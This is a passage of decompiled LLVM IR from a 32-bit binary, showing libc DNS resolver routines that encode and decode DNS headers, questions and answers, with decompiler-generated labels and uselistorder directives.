  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 6, 7, 8, 3, 18, 16, 15, 17, 4, 9, 10, 1, 2, 5, 11, 12, 13, 14 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80569c4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80569c2, { 1, 0 }
  uselistorder label %dec_label_pc_8056982, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056967, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056952, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_80568dc, { 1, 0 }
  uselistorder label %dec_label_pc_80568d1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80568c4, { 1, 0 }
  uselistorder label %dec_label_pc_80568c0, { 1, 0 }
  uselistorder label %dec_label_pc_80568ac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80568a9, { 1, 0 }
  uselistorder label %dec_label_pc_805687f, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_2()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80569d1 = load i32, i32* @ebx, align 4
  store i32 %v0_80569d1, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_80569d9 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_80569d9, i32* %esi.global-to-local, align 4
  %v7_80569e2 = icmp sgt i32 %tmp, 11
  br i1 %v7_80569e2, label %dec_label_pc_80569e8, label %dec_label_pc_8056a7e

dec_label_pc_80569e8:                             ; preds = %entry
  %v1_80569e8 = add i32 %tmp9, 1
  %v2_80569e8 = inttoptr i32 %v1_80569e8 to i8*
  %v3_80569e8 = load i8, i8* %v2_80569e8, align 1
  store i8 %v3_80569e8, i8* %tmp8, align 1
  %v0_80569ee = load i32, i32* %ebx.global-to-local, align 4
  %v1_80569ee = inttoptr i32 %v0_80569ee to i32*
  %v2_80569ee = load i32, i32* %v1_80569ee, align 4
  %v1_80569f0 = trunc i32 %v2_80569ee to i8
  %v2_80569f0 = load i32, i32* %esi.global-to-local, align 4
  %v3_80569f0 = add i32 %v2_80569f0, 1
  %v4_80569f0 = inttoptr i32 %v3_80569f0 to i8*
  store i8 %v1_80569f0, i8* %v4_80569f0, align 1
  %v0_8056a16 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a16 = add i32 %v0_8056a16, 8
  %v2_8056a16 = inttoptr i32 %v1_8056a16 to i32*
  %v3_8056a16 = load i32, i32* %v2_8056a16, align 4
  %v1_8056a19 = mul i32 %v3_8056a16, 8
  %v2_8056a1f = or i32 %v1_8056a19, 4
  %v1_8056a21 = add i32 %v0_8056a16, 20
  %v2_8056a21 = inttoptr i32 %v1_8056a21 to i32*
  %v3_8056a21 = load i32, i32* %v2_8056a21, align 4
  %v4_8056a21 = icmp eq i32 %v3_8056a21, 0
  %v1_8056a25 = icmp eq i1 %v4_8056a21, false
  %v2_8056a25 = zext i1 %v1_8056a25 to i32
  %v2_8056a28 = or i32 %v2_8056a25, %v2_8056a1f
  %v2_8056a2a = or i32 %v2_8056a28, -126
  %v5_8056a2a = trunc i32 %v2_8056a2a to i8
  store i32 %v2_8056a2a, i32* @ecx, align 4
  %v2_8056a2c = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a2c = add i32 %v2_8056a2c, 2
  %v4_8056a2c = inttoptr i32 %v3_8056a2c to i8*
  store i8 %v5_8056a2a, i8* %v4_8056a2c, align 1
  %v0_8056a2f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a35 = add i32 %v0_8056a2f, 28
  %v2_8056a35 = inttoptr i32 %v1_8056a35 to i8*
  %v3_8056a35 = load i8, i8* %v2_8056a35, align 1
  %tmp13 = urem i8 %v3_8056a35, 16
  %v2_8056a40 = or i8 %tmp13, -128
  %v2_8056a42 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a42 = add i32 %v2_8056a42, 3
  %v4_8056a42 = inttoptr i32 %v3_8056a42 to i8*
  store i8 %v2_8056a40, i8* %v4_8056a42, align 1
  %v0_8056a45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a45 = add i32 %v0_8056a45, 33
  %v2_8056a45 = inttoptr i32 %v1_8056a45 to i8*
  %v3_8056a45 = load i8, i8* %v2_8056a45, align 1
  %v2_8056a49 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a49 = add i32 %v2_8056a49, 4
  %v4_8056a49 = inttoptr i32 %v3_8056a49 to i8*
  store i8 %v3_8056a45, i8* %v4_8056a49, align 1
  %v0_8056a4c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a4c = add i32 %v0_8056a4c, 32
  %v2_8056a4c = inttoptr i32 %v1_8056a4c to i32*
  %v3_8056a4c = load i32, i32* %v2_8056a4c, align 4
  %v1_8056a4f = trunc i32 %v3_8056a4c to i8
  %v2_8056a4f = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a4f = add i32 %v2_8056a4f, 5
  %v4_8056a4f = inttoptr i32 %v3_8056a4f to i8*
  store i8 %v1_8056a4f, i8* %v4_8056a4f, align 1
  %v0_8056a52 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a52 = add i32 %v0_8056a52, 37
  %v2_8056a52 = inttoptr i32 %v1_8056a52 to i8*
  %v3_8056a52 = load i8, i8* %v2_8056a52, align 1
  %v2_8056a56 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a56 = add i32 %v2_8056a56, 6
  %v4_8056a56 = inttoptr i32 %v3_8056a56 to i8*
  store i8 %v3_8056a52, i8* %v4_8056a56, align 1
  %v0_8056a59 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a59 = add i32 %v0_8056a59, 36
  %v2_8056a59 = inttoptr i32 %v1_8056a59 to i32*
  %v3_8056a59 = load i32, i32* %v2_8056a59, align 4
  %v1_8056a5c = trunc i32 %v3_8056a59 to i8
  %v2_8056a5c = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a5c = add i32 %v2_8056a5c, 7
  %v4_8056a5c = inttoptr i32 %v3_8056a5c to i8*
  store i8 %v1_8056a5c, i8* %v4_8056a5c, align 1
  %v0_8056a5f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a5f = add i32 %v0_8056a5f, 41
  %v2_8056a5f = inttoptr i32 %v1_8056a5f to i8*
  %v3_8056a5f = load i8, i8* %v2_8056a5f, align 1
  %v2_8056a63 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a63 = add i32 %v2_8056a63, 8
  %v4_8056a63 = inttoptr i32 %v3_8056a63 to i8*
  store i8 %v3_8056a5f, i8* %v4_8056a63, align 1
  %v0_8056a66 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a66 = add i32 %v0_8056a66, 40
  %v2_8056a66 = inttoptr i32 %v1_8056a66 to i32*
  %v3_8056a66 = load i32, i32* %v2_8056a66, align 4
  %v1_8056a69 = trunc i32 %v3_8056a66 to i8
  %v2_8056a69 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a69 = add i32 %v2_8056a69, 9
  %v4_8056a69 = inttoptr i32 %v3_8056a69 to i8*
  store i8 %v1_8056a69, i8* %v4_8056a69, align 1
  %v0_8056a6c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a6c = add i32 %v0_8056a6c, 45
  %v2_8056a6c = inttoptr i32 %v1_8056a6c to i8*
  %v3_8056a6c = load i8, i8* %v2_8056a6c, align 1
  %v2_8056a70 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a70 = add i32 %v2_8056a70, 10
  %v4_8056a70 = inttoptr i32 %v3_8056a70 to i8*
  store i8 %v3_8056a6c, i8* %v4_8056a70, align 1
  %v0_8056a73 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056a73 = add i32 %v0_8056a73, 44
  %v2_8056a73 = inttoptr i32 %v1_8056a73 to i32*
  %v3_8056a73 = load i32, i32* %v2_8056a73, align 4
  %v1_8056a76 = trunc i32 %v3_8056a73 to i8
  %v2_8056a76 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056a76 = add i32 %v2_8056a76, 11
  %v4_8056a76 = inttoptr i32 %v3_8056a76 to i8*
  store i8 %v1_8056a76, i8* %v4_8056a76, align 1
  %v2_8056a7e.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8056a7e

dec_label_pc_8056a7e:                             ; preds = %entry, %dec_label_pc_80569e8
  %v2_8056a7e = phi i32 [ %v0_80569d1, %entry ], [ %v2_8056a7e.pre, %dec_label_pc_80569e8 ]
  %v0_8056a80 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80569e8 ]
  store i32 %v2_8056a7e, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056a80

; uselistorder directives
  uselistorder i32 45, { 6, 2, 5, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 4, 2, 0, 3, 1 }
  uselistorder i32 33, { 5, 3, 4, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056a7e, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8056a84 = load i32, i32* @ebx, align 4
  store i32 %v0_8056a84, i32* %stack_var_-4, align 4
  %v4_8056a85 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8056a85, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8056a8d = load i8, i8* %tmp2, align 1
  %v3_8056a8d = zext i8 %v2_8056a8d to i32
  %v1_8056a90 = add i32 %v4_8056a85, 1
  %v2_8056a90 = inttoptr i32 %v1_8056a90 to i8*
  %v3_8056a90 = load i8, i8* %v2_8056a90, align 1
  %v4_8056a90 = zext i8 %v3_8056a90 to i32
  %v2_8056a94 = mul nuw nsw i32 %v3_8056a8d, 256
  %v2_8056a97 = or i32 %v4_8056a90, %v2_8056a94
  %v2_8056a99 = inttoptr i32 %tmp to i32*
  store i32 %v2_8056a97, i32* %v2_8056a99, align 4
  %v0_8056a9b = load i32, i32* @ecx, align 4
  %v1_8056a9b = add i32 %v0_8056a9b, 2
  %v2_8056a9b = inttoptr i32 %v1_8056a9b to i8*
  %v3_8056a9b = load i8, i8* %v2_8056a9b, align 1
  %tmp6 = icmp slt i8 %v3_8056a9b, 0
  %v2_8056a9f = zext i1 %tmp6 to i32
  %v1_8056aa2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056aa2 = add i32 %v1_8056aa2, 4
  %v3_8056aa2 = inttoptr i32 %v2_8056aa2 to i32*
  store i32 %v2_8056a9f, i32* %v3_8056aa2, align 4
  %v0_8056aa5 = load i32, i32* @ecx, align 4
  %v1_8056aa5 = add i32 %v0_8056aa5, 2
  %v2_8056aa5 = inttoptr i32 %v1_8056aa5 to i8*
  %v3_8056aa5 = load i8, i8* %v2_8056aa5, align 1
  %v3_8056aa8 = udiv i8 %v3_8056aa5, 8
  %tmp7 = urem i8 %v3_8056aa8, 16
  %v1_8056aab = zext i8 %tmp7 to i32
  %v1_8056aae = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056aae = add i32 %v1_8056aae, 8
  %v3_8056aae = inttoptr i32 %v2_8056aae to i32*
  store i32 %v1_8056aab, i32* %v3_8056aae, align 4
  %v0_8056ab1 = load i32, i32* @ecx, align 4
  %v1_8056ab1 = add i32 %v0_8056ab1, 2
  %v2_8056ab1 = inttoptr i32 %v1_8056ab1 to i8*
  %v3_8056ab1 = load i8, i8* %v2_8056ab1, align 1
  %div = udiv i8 %v3_8056ab1, 4
  %tmp8 = urem i8 %div, 2
  %v1_8056ab8 = zext i8 %tmp8 to i32
  %v1_8056abb = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056abb = add i32 %v1_8056abb, 12
  %v3_8056abb = inttoptr i32 %v2_8056abb to i32*
  store i32 %v1_8056ab8, i32* %v3_8056abb, align 4
  %v0_8056abe = load i32, i32* @ecx, align 4
  %v1_8056abe = add i32 %v0_8056abe, 2
  %v2_8056abe = inttoptr i32 %v1_8056abe to i8*
  %v3_8056abe = load i8, i8* %v2_8056abe, align 1
  %div5 = udiv i8 %v3_8056abe, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8056ac4 = zext i8 %tmp9 to i32
  %v1_8056ac7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056ac7 = add i32 %v1_8056ac7, 16
  %v3_8056ac7 = inttoptr i32 %v2_8056ac7 to i32*
  store i32 %v1_8056ac4, i32* %v3_8056ac7, align 4
  %v0_8056aca = load i32, i32* @ecx, align 4
  %v1_8056aca = add i32 %v0_8056aca, 2
  %v2_8056aca = inttoptr i32 %v1_8056aca to i8*
  %v3_8056aca = load i8, i8* %v2_8056aca, align 1
  %tmp10 = urem i8 %v3_8056aca, 2
  %v1_8056ace = zext i8 %tmp10 to i32
  %v1_8056ad1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056ad1 = add i32 %v1_8056ad1, 20
  %v3_8056ad1 = inttoptr i32 %v2_8056ad1 to i32*
  store i32 %v1_8056ace, i32* %v3_8056ad1, align 4
  %v0_8056ad4 = load i32, i32* @ecx, align 4
  %v1_8056ad4 = add i32 %v0_8056ad4, 3
  %v2_8056ad4 = inttoptr i32 %v1_8056ad4 to i8*
  %v3_8056ad4 = load i8, i8* %v2_8056ad4, align 1
  %tmp11 = icmp slt i8 %v3_8056ad4, 0
  %v2_8056ad8 = zext i1 %tmp11 to i32
  %v1_8056adb = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056adb = add i32 %v1_8056adb, 24
  %v3_8056adb = inttoptr i32 %v2_8056adb to i32*
  store i32 %v2_8056ad8, i32* %v3_8056adb, align 4
  %v0_8056ade = load i32, i32* @ecx, align 4
  %v1_8056ade = add i32 %v0_8056ade, 3
  %v2_8056ade = inttoptr i32 %v1_8056ade to i8*
  %v3_8056ade = load i8, i8* %v2_8056ade, align 1
  %tmp12 = urem i8 %v3_8056ade, 16
  %v1_8056ae2 = zext i8 %tmp12 to i32
  %v1_8056ae5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056ae5 = add i32 %v1_8056ae5, 28
  %v3_8056ae5 = inttoptr i32 %v2_8056ae5 to i32*
  store i32 %v1_8056ae2, i32* %v3_8056ae5, align 4
  %v0_8056ae8 = load i32, i32* @ecx, align 4
  %v1_8056ae8 = add i32 %v0_8056ae8, 4
  %v2_8056ae8 = inttoptr i32 %v1_8056ae8 to i8*
  %v3_8056ae8 = load i8, i8* %v2_8056ae8, align 1
  %v4_8056ae8 = zext i8 %v3_8056ae8 to i32
  %v1_8056aec = add i32 %v0_8056ae8, 5
  %v2_8056aec = inttoptr i32 %v1_8056aec to i8*
  %v3_8056aec = load i8, i8* %v2_8056aec, align 1
  %v4_8056aec = zext i8 %v3_8056aec to i32
  %v2_8056af0 = mul nuw nsw i32 %v4_8056ae8, 256
  %v2_8056af3 = or i32 %v4_8056aec, %v2_8056af0
  %v1_8056af5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056af5 = add i32 %v1_8056af5, 32
  %v3_8056af5 = inttoptr i32 %v2_8056af5 to i32*
  store i32 %v2_8056af3, i32* %v3_8056af5, align 4
  %v0_8056af8 = load i32, i32* @ecx, align 4
  %v1_8056af8 = add i32 %v0_8056af8, 6
  %v2_8056af8 = inttoptr i32 %v1_8056af8 to i8*
  %v3_8056af8 = load i8, i8* %v2_8056af8, align 1
  %v4_8056af8 = zext i8 %v3_8056af8 to i32
  %v1_8056afc = add i32 %v0_8056af8, 7
  %v2_8056afc = inttoptr i32 %v1_8056afc to i8*
  %v3_8056afc = load i8, i8* %v2_8056afc, align 1
  %v4_8056afc = zext i8 %v3_8056afc to i32
  %v2_8056b00 = mul nuw nsw i32 %v4_8056af8, 256
  %v2_8056b03 = or i32 %v4_8056afc, %v2_8056b00
  %v1_8056b05 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056b05 = add i32 %v1_8056b05, 36
  %v3_8056b05 = inttoptr i32 %v2_8056b05 to i32*
  store i32 %v2_8056b03, i32* %v3_8056b05, align 4
  %v0_8056b08 = load i32, i32* @ecx, align 4
  %v1_8056b08 = add i32 %v0_8056b08, 8
  %v2_8056b08 = inttoptr i32 %v1_8056b08 to i8*
  %v3_8056b08 = load i8, i8* %v2_8056b08, align 1
  %v4_8056b08 = zext i8 %v3_8056b08 to i32
  %v1_8056b0c = add i32 %v0_8056b08, 9
  %v2_8056b0c = inttoptr i32 %v1_8056b0c to i8*
  %v3_8056b0c = load i8, i8* %v2_8056b0c, align 1
  %v4_8056b0c = zext i8 %v3_8056b0c to i32
  %v2_8056b10 = mul nuw nsw i32 %v4_8056b08, 256
  %v2_8056b13 = or i32 %v4_8056b0c, %v2_8056b10
  %v1_8056b15 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056b15 = add i32 %v1_8056b15, 40
  %v3_8056b15 = inttoptr i32 %v2_8056b15 to i32*
  store i32 %v2_8056b13, i32* %v3_8056b15, align 4
  %v0_8056b18 = load i32, i32* @ecx, align 4
  %v1_8056b18 = add i32 %v0_8056b18, 10
  %v2_8056b18 = inttoptr i32 %v1_8056b18 to i8*
  %v3_8056b18 = load i8, i8* %v2_8056b18, align 1
  %v4_8056b18 = zext i8 %v3_8056b18 to i32
  %v1_8056b1c = add i32 %v0_8056b18, 11
  %v2_8056b1c = inttoptr i32 %v1_8056b1c to i8*
  %v3_8056b1c = load i8, i8* %v2_8056b1c, align 1
  %v4_8056b1c = zext i8 %v3_8056b1c to i32
  %v2_8056b20 = mul nuw nsw i32 %v4_8056b18, 256
  %v2_8056b23 = or i32 %v4_8056b1c, %v2_8056b20
  %v1_8056b25 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056b25 = add i32 %v1_8056b25, 44
  %v3_8056b25 = inttoptr i32 %v2_8056b25 to i32*
  store i32 %v2_8056b23, i32* %v3_8056b25, align 4
  %v2_8056b2d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056b2d, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 11, 12, 4, 5, 7, 8, 13, 6, 2, 9, 10, 0, 1, 3 }
  uselistorder i32 40, { 9, 10, 3, 12, 13, 14, 11, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 7, { 20, 21, 4, 8, 5, 0, 3, 9, 16, 17, 18, 19, 6, 1, 15, 7, 10, 11, 12, 13, 14, 2 }
  uselistorder i32 6, { 26, 27, 2, 3, 21, 22, 0, 7, 19, 15, 16, 9, 29, 17, 23, 24, 4, 1, 5, 8, 13, 14, 18, 25, 10, 20, 11, 12, 28, 6 }
  uselistorder i32 28, { 35, 36, 18, 19, 37, 25, 49, 48, 41, 42, 2, 43, 44, 45, 46, 47, 4, 5, 6, 0, 26, 17, 20, 21, 38, 39, 27, 28, 29, 30, 31, 32, 1, 33, 50, 40, 22, 23, 24, 7, 8, 34, 13, 12, 10, 11, 14, 15, 9, 16, 3 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 16, 5, 13, 21, 17, 6, 18, 7, 8, 9, 10, 11, 19, 20, 12, 14, 15 }
  uselistorder i8 4, { 0, 5, 1, 6, 7, 2, 3, 4 }
  uselistorder i8 16, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i8 8, { 0, 7, 2, 6, 3, 1, 4, 5 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8056b30 = load i32, i32* @edi, align 4
  %v0_8056b31 = load i32, i32* @esi, align 4
  %v0_8056b32 = load i32, i32* @ebx, align 4
  store i32 %v0_8056b32, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8056b3f = load i32, i32* @eax, align 4
  %v1_8056b42 = inttoptr i32 %tmp3 to i32*
  %v2_8056b42 = load i32, i32* %v1_8056b42, align 4
  %v7_8056b44 = inttoptr i32 %v2_8056b42 to i8*
  %v8_8056b44 = call i32 @__encode_dotted(i8* %v7_8056b44, i32 %tmp2, i32 %tmp, i32 %v0_8056b3f, i32 %v0_8056b32, i32 %v0_8056b31, i32 %v0_8056b30)
  store i32 %v8_8056b44, i32* @ecx, align 4
  %v2_8056b4e = icmp slt i32 %v8_8056b44, 0
  br i1 %v2_8056b4e, label %dec_label_pc_8056b7d, label %dec_label_pc_8056b52

dec_label_pc_8056b52:                             ; preds = %entry
  %v0_8056b52 = load i32, i32* @ebx, align 4
  %v2_8056b52 = sub i32 %v0_8056b52, %v8_8056b44
  %v1_8056b54 = add i32 %v2_8056b52, -3
  %v6_8056b54 = sub i32 2, %v2_8056b52
  %v7_8056b54 = and i32 %v6_8056b54, %v2_8056b52
  %v8_8056b54 = icmp slt i32 %v7_8056b54, 0
  %v9_8056b54 = icmp eq i32 %v1_8056b54, 0
  %v10_8056b54 = icmp slt i32 %v1_8056b54, 0
  %v3_8056b57 = icmp eq i1 %v10_8056b54, %v8_8056b54
  %v4_8056b57 = icmp eq i1 %v9_8056b54, false
  %v5_8056b57 = and i1 %v4_8056b57, %v3_8056b57
  br i1 %v5_8056b57, label %dec_label_pc_8056b5e, label %dec_label_pc_8056b59

dec_label_pc_8056b59:                             ; preds = %dec_label_pc_8056b52
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8056b7d

dec_label_pc_8056b5e:                             ; preds = %dec_label_pc_8056b52
  %v0_8056b5e = load i32, i32* @edi, align 4
  %v2_8056b5e = add i32 %v0_8056b5e, %v8_8056b44
  store i32 %v2_8056b5e, i32* @edx, align 4
  %v1_8056b61 = add i32 %v8_8056b44, 4
  store i32 %v1_8056b61, i32* @ecx, align 4
  %v0_8056b64 = load i32, i32* @esi, align 4
  %v1_8056b64 = add i32 %v0_8056b64, 5
  %v2_8056b64 = inttoptr i32 %v1_8056b64 to i8*
  %v3_8056b64 = load i8, i8* %v2_8056b64, align 1
  %v3_8056b68 = inttoptr i32 %v2_8056b5e to i8*
  store i8 %v3_8056b64, i8* %v3_8056b68, align 1
  %v0_8056b6a = load i32, i32* @esi, align 4
  %v1_8056b6a = add i32 %v0_8056b6a, 4
  %v2_8056b6a = inttoptr i32 %v1_8056b6a to i32*
  %v3_8056b6a = load i32, i32* %v2_8056b6a, align 4
  %v1_8056b6d = trunc i32 %v3_8056b6a to i8
  %v2_8056b6d = load i32, i32* @edx, align 4
  %v3_8056b6d = add i32 %v2_8056b6d, 1
  %v4_8056b6d = inttoptr i32 %v3_8056b6d to i8*
  store i8 %v1_8056b6d, i8* %v4_8056b6d, align 1
  %v0_8056b70 = load i32, i32* @esi, align 4
  %v1_8056b70 = add i32 %v0_8056b70, 9
  %v2_8056b70 = inttoptr i32 %v1_8056b70 to i8*
  %v3_8056b70 = load i8, i8* %v2_8056b70, align 1
  %v2_8056b74 = load i32, i32* @edx, align 4
  %v3_8056b74 = add i32 %v2_8056b74, 2
  %v4_8056b74 = inttoptr i32 %v3_8056b74 to i8*
  store i8 %v3_8056b70, i8* %v4_8056b74, align 1
  %v0_8056b77 = load i32, i32* @esi, align 4
  %v1_8056b77 = add i32 %v0_8056b77, 8
  %v2_8056b77 = inttoptr i32 %v1_8056b77 to i32*
  %v3_8056b77 = load i32, i32* %v2_8056b77, align 4
  %v1_8056b7a = trunc i32 %v3_8056b77 to i8
  %v2_8056b7a = load i32, i32* @edx, align 4
  %v3_8056b7a = add i32 %v2_8056b7a, 3
  %v4_8056b7a = inttoptr i32 %v3_8056b7a to i8*
  store i8 %v1_8056b7a, i8* %v4_8056b7a, align 1
  %v0_8056b7d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056b7d

dec_label_pc_8056b7d:                             ; preds = %entry, %dec_label_pc_8056b59, %dec_label_pc_8056b5e
  %v0_8056b7d = phi i32 [ %v8_8056b44, %entry ], [ -1, %dec_label_pc_8056b59 ], [ %v0_8056b7d.pre, %dec_label_pc_8056b5e ]
  %v2_8056b7f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056b7f, i32* @ebx, align 4
  store i32 %v0_8056b30, i32* @edi, align 4
  ret i32 %v0_8056b7d

; uselistorder directives
  uselistorder i32 %v1_8056b54, { 1, 0 }
  uselistorder i32 %v2_8056b52, { 0, 2, 1 }
  uselistorder i32 %v8_8056b44, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 0, 5 }
  uselistorder label %dec_label_pc_8056b7d, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8056b8f = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_8056b97 = icmp slt i32 %v2_8056b8f, 0
  br i1 %v2_8056b97, label %dec_label_pc_8056b9e, label %dec_label_pc_8056b9b

dec_label_pc_8056b9b:                             ; preds = %entry
  %v1_8056b9b = add i32 %v2_8056b8f, 4
  br label %dec_label_pc_8056b9e

dec_label_pc_8056b9e:                             ; preds = %entry, %dec_label_pc_8056b9b
  %v0_8056ba1 = phi i32 [ %v2_8056b8f, %entry ], [ %v1_8056b9b, %dec_label_pc_8056b9b ]
  ret i32 %v0_8056ba1

; uselistorder directives
  uselistorder label %dec_label_pc_8056b9e, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056ba4 = load i32, i32* @ebp, align 4
  %v0_8056ba5 = load i32, i32* @edi, align 4
  %v0_8056ba6 = load i32, i32* @esi, align 4
  %v0_8056ba7 = load i32, i32* @ebx, align 4
  store i32 %v0_8056ba7, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8056bc8 = ptrtoint i32* %stack_var_-272 to i32
  %v4_8056bd5 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8056bc8, i32 256)
  store i32 %v4_8056bd5, i32* @edi, align 4
  %v3_8056bdf = icmp slt i32 %v4_8056bd5, 0
  br i1 %v3_8056bdf, label %dec_label_pc_8056c90, label %dec_label_pc_8056be7

dec_label_pc_8056be7:                             ; preds = %entry
  %v0_8056be7 = load i32, i32* @ebx, align 4
  %v3_8056be7 = add i32 %v0_8056be7, %v4_8056bd5
  %v0_8056be9 = load i32, i32* @esi, align 4
  %v2_8056be9 = sub i32 %v0_8056be9, %v3_8056be7
  %v1_8056bef = add i32 %v2_8056be9, -10
  %v10_8056bef = icmp slt i32 %v1_8056bef, 0
  store i32 %v1_8056bef, i32* @esi, align 4
  %v1_8056bf6 = icmp eq i1 %v10_8056bef, false
  br i1 %v1_8056bf6, label %dec_label_pc_8056bff, label %dec_label_pc_8056bf8

dec_label_pc_8056bf8:                             ; preds = %dec_label_pc_8056be7
  br label %dec_label_pc_8056c90

dec_label_pc_8056bff:                             ; preds = %dec_label_pc_8056be7
  %v6_8056c06 = add i32 %v3_8056be7, %tmp4
  store i32 %v6_8056c06, i32* @ebx, align 4
  %v1_8056c12 = bitcast i32* %stack_var_-272 to i8*
  %v2_8056c12 = call i32 @__GI_strdup(i8* %v1_8056c12)
  %v1_8056c17 = load i32, i32* @ebp, align 4
  %v2_8056c17 = inttoptr i32 %v1_8056c17 to i32*
  store i32 %v2_8056c12, i32* %v2_8056c17, align 4
  %v0_8056c1a = load i32, i32* @ebx, align 4
  %v1_8056c1a = add i32 %v0_8056c1a, 4
  store i32 %v1_8056c1a, i32* %esi.global-to-local, align 4
  %v1_8056c1d = inttoptr i32 %v0_8056c1a to i8*
  %v2_8056c1d = load i8, i8* %v1_8056c1d, align 1
  %v3_8056c1d = zext i8 %v2_8056c1d to i32
  %v1_8056c20 = add i32 %v0_8056c1a, 1
  %v2_8056c20 = inttoptr i32 %v1_8056c20 to i8*
  %v3_8056c20 = load i8, i8* %v2_8056c20, align 1
  %v4_8056c20 = zext i8 %v3_8056c20 to i32
  %v2_8056c24 = mul nuw nsw i32 %v3_8056c1d, 256
  %v2_8056c27 = or i32 %v4_8056c20, %v2_8056c24
  %v1_8056c29 = load i32, i32* @ebp, align 4
  %v2_8056c29 = add i32 %v1_8056c29, 4
  %v3_8056c29 = inttoptr i32 %v2_8056c29 to i32*
  store i32 %v2_8056c27, i32* %v3_8056c29, align 4
  %v0_8056c2c = load i32, i32* @ebx, align 4
  %v1_8056c2c = add i32 %v0_8056c2c, 2
  %v2_8056c2c = inttoptr i32 %v1_8056c2c to i8*
  %v3_8056c2c = load i8, i8* %v2_8056c2c, align 1
  %v4_8056c2c = zext i8 %v3_8056c2c to i32
  %v1_8056c30 = add i32 %v0_8056c2c, 3
